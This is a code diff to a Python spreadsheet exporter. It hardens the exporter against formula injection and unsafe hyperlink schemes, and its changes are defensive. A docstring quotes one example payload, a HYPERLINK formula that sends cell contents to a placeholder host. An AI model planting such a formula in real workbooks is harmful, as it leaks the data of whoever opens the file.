@@ -67,6 +67,48 @@ _MIDDLE = Alignment(vertical="center")
 _BOTTOM_BORDER = Border(bottom=Side(style="thin", color="D9D9D9"))
 
 
+def _write_cell(sheet, row, col, value):
+    """Write one externally-sourced value as inert text.
+
+    openpyxl does not merely store a leading "=" -- it *types* the cell as a
+    formula (data_type 'f'), so a prospect whose name arrives as
+    `=HYPERLINK("http://x/?"&A1)` ships a working exfiltration link inside the
+    rep's workbook. Everything in this sheet comes from a profile, a community
+    message or a model draft, so nothing in it is trusted enough to be code.
+
+    Forcing data_type to "s" is the fix, and it is sufficient: openpyxl then
+    writes `t="inlineStr"`, which Excel renders as literal text -- a formula
+    needs an `<f>` element it will no longer have. Deliberately *not* the
+    apostrophe trick here. In xlsx the apostrophe has no special meaning at
+    rest (it is Excel's input-time convention, replayed on read only via a
+    quotePrefix style), so it would be stored as a visible character and every
+    revealed phone number would render as `'+15551234567`. The CSV export has
+    no type system and does need the apostrophe -- see csvCell in the template.
+    """
+    cell = sheet.cell(row, col, "" if value is None else str(value))
+    cell.data_type = "s"
+    return cell
+
+
+def _safe_hyperlink(url):
+    """Return an http(s) target for a LinkedIn cell, or None to leave it plain.
+
+    A hyperlink is the one place a cell value becomes something the reader's
+    machine acts on, so the scheme is checked rather than assumed. A bare
+    `linkedin.com/in/example-person-04` is normal input and gets the prefix; anything carrying
+    its own non-http scheme is not a profile URL and does not get to be a link.
+    """
+    target = (url or "").strip()
+    if not target:
+        return None
+    lowered = target.lower()
+    if lowered.startswith(("http://", "https://")):
+        return target
+    if ":" in target.split("/", 1)[0]:
+        return None
+    return f"https://{target}"
+
+
 def _banner_font(palette):
     return Font(name="Calibri", bold=True, italic=True, size=14, color=palette["account"])
 
@@ -80,8 +122,21 @@ def _account_font():
 
 
 def _open_or_create(path, banner, palette):
+    """Open the rep's workbook, or start one.
+
+    Appending to whatever already sits at `path` is the point -- one workbook per
+    rep, a new WEEK block each Monday. It is also why a wrong path is quiet
+    rather than loud: a typo'd or reused name grafts this rep's week onto an
+    unrelated workbook and still returns True. Refuse anything that is not the
+    .xlsx we expect to be extending, which is the cheapest way to turn that into
+    an error at the call site instead of a support question later.
+    """
     target = Path(path)
+    if target.suffix.lower() != ".xlsx":
+        raise ValueError(f"expected an .xlsx path, got {target.name!r}")
     if target.exists():
+        if not target.is_file():
+            raise ValueError(f"{target.name!r} is not a file")
         return load_workbook(target)
 
     workbook = Workbook()
@@ -113,8 +168,9 @@ def _last_used_row(sheet):
 
 
 def _write_banner_row(sheet, row, text, fill_color, font):
+    """Banner rows carry account names, which are external values like any other."""
     sheet.merge_cells(start_row=row, start_column=1, end_row=row, end_column=NCOL)
-    cell = sheet.cell(row, 1, text)
+    cell = _write_cell(sheet, row, 1, text)
     cell.fill = PatternFill("solid", fgColor=fill_color)
     cell.font = font
     cell.alignment = Alignment(vertical="center", indent=1)
@@ -140,11 +196,12 @@ def _write_contact_row(sheet, row, contact, touchpoints, validation):
     ]
 
     is_unfilled_seat = str(contact.get("name", "")).upper().startswith("TBD")
+    link_target = _safe_hyperlink(linkedin)
     for col, value in enumerate(values, start=1):
-        cell = sheet.cell(row, col, value)
-        if col == LINKEDIN_COL and linkedin:
+        cell = _write_cell(sheet, row, col, value)
+        if col == LINKEDIN_COL and link_target:
             cell.font = _LINK_FONT
-            cell.hyperlink = linkedin if linkedin.startswith("http") else f"https://{linkedin}"
+            cell.hyperlink = link_target
         elif is_unfilled_seat and col <= 2:
             cell.font = _TBD_FONT
         else:
